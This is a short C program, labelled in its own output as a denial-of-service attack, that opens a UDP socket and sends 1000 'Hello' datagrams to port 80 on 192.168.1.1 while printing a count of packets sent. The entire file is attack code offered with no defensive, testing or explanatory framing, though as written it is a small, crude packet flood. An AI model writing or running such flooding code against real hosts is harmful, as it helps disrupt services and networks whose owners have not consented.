#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>

int main() {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    struct sockaddr_in target;
    
    target.sin_family = AF_INET;
    target.sin_port = htons(80);
    target.sin_addr.s_addr = inet_addr("192.168.1.1");

    char *msg = "Hello";
    
    printf("Starting DoS attack...\n");
    for (int i = 0; i < 1000; i++) {
        sendto(sock, msg, strlen(msg), 0, (struct sockaddr *)&target, sizeof(target));
        printf("Packet %d sent\n", i + 1);
    }
    
    close(sock);
    printf("DoS attack completed.\n");
    return 0;
}

